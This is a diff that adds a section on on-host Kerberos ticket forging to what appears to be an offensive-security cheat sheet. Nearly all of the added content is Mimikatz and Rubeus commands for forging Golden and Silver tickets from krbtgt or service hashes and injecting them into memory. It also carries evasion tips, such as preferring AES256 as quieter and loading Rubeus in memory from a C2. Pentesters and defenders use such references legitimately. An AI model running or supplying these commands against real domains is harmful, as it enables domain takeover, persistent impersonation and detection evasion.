@@ -39,3 +39,53 @@ Do I have the krbtgt key?
 ```bash
 impacket-ticketConverter ticket.kirbi ticket.ccache
 ```
+
+## On-host forging (Mimikatz / Rubeus)
+
+:::tabs
+
+=== Golden (TGT)
+
+::: code-group
+
+```powershell [Mimikatz]
+# /ptt injects into memory; drop /ptt + add /ticket:gold.kirbi to write to disk
+kerberos::golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /krbtgt:$KRBTGT_NT_HASH /ptt
+
+# AES256 variant (quieter than RC4, matches modern KDC crypto)
+kerberos::golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /aes256:$KRBTGT_AES_HASH /ptt
+```
+
+```powershell [Rubeus]
+# Typically loaded in-memory via `execute-assembly` from a C2 - no binary on disk
+Rubeus.exe golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /rc4:$KRBTGT_NT_HASH /ptt
+
+# AES256 variant
+Rubeus.exe golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /aes256:$KRBTGT_AES_HASH /ptt
+```
+
+=== Silver (TGS)
+
+::: code-group
+
+```powershell [Mimikatz]
+# `kerberos::golden` also forges Silver tickets: /service + /target replace the SPN,
+# and the service key replaces krbtgt. No /krbtgt means no KDC signature (Silver).
+kerberos::golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID \
+  /target:$TARGET_HOST /service:cifs /rc4:$SERVICE_NT_HASH /ptt
+
+# AES256 variant
+kerberos::golden /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID \
+  /target:$TARGET_HOST /service:cifs /aes256:$SERVICE_AES_KEY /ptt
+```
+
+```powershell [Rubeus]
+Rubeus.exe silver /service:cifs/$TARGET_HOST /rc4:$SERVICE_NT_HASH \
+  /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /ptt
+
+# AES256 variant
+Rubeus.exe silver /service:cifs/$TARGET_HOST /aes256:$SERVICE_AES_KEY \
+  /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID /ptt
+```
+
+:::
